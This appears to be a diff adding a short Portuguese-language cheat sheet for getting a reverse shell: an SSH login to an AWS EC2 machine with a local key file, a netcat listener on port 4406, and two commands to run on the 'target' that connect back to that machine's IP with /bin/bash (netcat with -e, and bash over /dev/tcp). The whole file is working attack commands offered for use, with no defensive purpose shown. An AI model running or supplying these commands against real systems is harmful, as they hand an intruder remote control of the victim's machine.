@@ -1,0 +1,13 @@
+CONECTAR COM A MÁQUINA ONLINE
+	
+	ssh -i /home/garruk/Documentos/blog.pem bitnami@ec2-54-94-246-241.sa-east-1.compute.amazonaws.com
+
+ABRIR PORTA PARA CONEXÃO COM O NETCAT
+	
+	nc -lnvp 4406
+
+CONETCAR O ALVO
+	
+	nc 54.94.246.241 4406 -e /bin/bash
+
+	bash -i >& /dev/tcp/54.94.246.241/4406 0>&1   --> shell melhorado
